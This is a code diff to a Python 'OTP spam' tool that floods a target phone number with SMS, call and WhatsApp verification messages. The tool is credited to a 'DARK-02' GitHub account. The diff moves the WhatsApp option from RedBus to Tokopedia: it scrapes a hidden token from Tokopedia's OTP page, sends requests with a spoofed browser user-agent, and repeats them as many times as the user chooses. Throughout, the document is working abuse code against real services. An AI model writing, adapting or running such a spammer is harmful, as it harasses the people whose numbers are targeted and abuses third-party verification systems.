@@ -71,41 +71,42 @@ def mr_dark_input():
          dark_point = 1
          print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37mRUNNING \033[1;33m• \033[0m\033[1;30m]══════════════>")
          xl_0 = input("   \033[1;37m[\033[1;35m#\033[1;37m] No Target: \033[36m0")
-         xl = ("0"+xl_0)
+         no = ("0"+xl_0)
          jumlah = int(input("   \033[1;37m[\033[1;35m#\033[1;37m] Jumlah: \033[36m"))
          InquiryId_xl = "237992422"
          id_xl = "237775262"
-         data={
-         "inquiryId":InquiryId_xl,
-         "phoneNumber":xl,
-         "transactionId":id_xl
+         dark_user = {
+         'User-Agent' : 'Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36',
+         'Accept-Encoding' : 'gzip, deflate',
+         'Connection' : 'keep-alive',
+         'Origin' : 'https://accounts.tokopedia.com',
+         'Accept' : 'application/json, text/javascript, */*; q=0.01',
+         'X-Requested-With' : 'XMLHttpRequest',
+         'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'
          }
-         mr_dark={
-         "Accept": "application/json, text/plain, */*",
-         "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-         "Connection": "keep-alive",
-         "Content-Length": "24",
-         "content-type": "application/json",
-         "Host": "cmsapi.mapclub.com",
-         "Origin": "https://www.mapclub.com",
-         "Referer": "https://www.mapclub.com/id/user/signup",
-         "Sec-Fetch-Mode": "cors",
-         "Sec-Fetch-Site": "same-site",
-         "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36"
+         regist = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+no+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = dark_user).text
+         drk = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
+         mr_dark_to_the_moon = {
+         "otp_type" : "116",
+         "msisdn" : no,
+         "tk" : drk,
+         "email" : '',
+         "original_param" : "",
+         "user_id" : "",
+         "signature" : "",
+         "number_otp_digit" : "6"
          }
-         dt = {"phone":xl}
-         dtjs = json.dumps(dt)
+         mr_dark_bruh = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = dark_user, data = mr_dark_to_the_moon).text
          print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37mSTATUS \033[1;33m• \033[0m\033[1;30m]══════════════>")
          for i in range(int(jumlah)):
-             url2 = 'https://m.redbus.id/api/getOtp?number='+xl+'&cc=62&whatsAppOpted=True'
-             a = requests.get(url2,headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36"}).text
-             b = json.loads(a)["Message"]
-             if b == 'OTP Sent Successfully':
-                  print(f'   \033[1;37m[\033[1;32m{dark_point}\033[1;37m] \033[1;32mTerkirim \033[31m ')
-                  dark_point += 1
+             if 'Anda sudah melakukan 3 kali pengiriman kode' in mr_dark_bruh:
+                  print(f'   \033[1;37m[\033[31m{dark_point}\033[1;37m] \033[1;37mSilahkan Coba Ulang Setelah 5 menit! \033[31m ')
                   time.sleep(5)
+                  dark_point += 1
              else:
-                  print(f'   \033[1;37m[\033[31m{dark_point}\033[1;37m] \033[1;37msilah kan coba lagi setelah 15 menit! \033[31m ')
+                  print(f'   \033[1;37m[\033[1;32m{dark_point}\033[1;37m] \033[1;32mTerkirim \033[31m ')
+                  time.sleep(5)
+                  dark_point += 1
     elif subs_mr_dark == "2":
          dark_point = 1
          print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37mRUNNING \033[1;33m• \033[0m\033[1;30m]══════════════>")
@@ -158,11 +159,11 @@ def banner_anjay_subs_mr_dark():
     print ("    \033[1;37m\033[31m>\033[1;37m Github\033[31m:\033[1;37m\033[1;37m github.com/DARK-02 ")
     print ("")
     print ("   \033[1;37m\033[31m>\033[1;37m Status Otp\033[31m:\033[1;37m\033[1;32m Running")
-    print ("   \033[1;37m\033[31m>\033[1;37m Version\033[31m:\033[1;37m\033[1;37m 1\033[31m.\033[1;37m1")
+    print ("   \033[1;37m\033[31m>\033[1;37m Version\033[31m:\033[1;37m\033[1;37m 1\033[31m.\033[1;37m6")
     print ("")
     print ("    \033[1;37m\033[31m\033[1;33m1\033[31m.\033[1;37m \033[31m\033[1;37m\033[1;37mSpam Sms \033[31m(\033[36mDuniaGames\033[31m) ")
     print ("    \033[1;37m\033[31m\033[1;33m2\033[31m.\033[1;37m \033[31m\033[1;37m\033[1;37mSpam Call \033[31m(\033[36mJagreward\033[31m) ")
-    print ("    \033[1;37m\033[31m\033[1;33m3\033[31m.\033[1;37m \033[31m\033[1;37m\033[1;37mSpam Whatsapp \033[31m(\033[36mRedBus\033[31m) ")
+    print ("    \033[1;37m\033[31m\033[1;33m3\033[31m.\033[1;37m \033[31m\033[1;37m\033[1;37mSpam Whatsapp \033[31m(\033[36mTokopedia\033[31m) ")
     print ("    \033[1;37m\033[31m\033[1;33m4\033[31m.\033[1;37m \033[31m\033[1;37m\033[1;37mJoin Grup Dark Club \033[31m(\033[32mWhatsapp\033[31m) ")
     print ("")
     mr_dark_input()
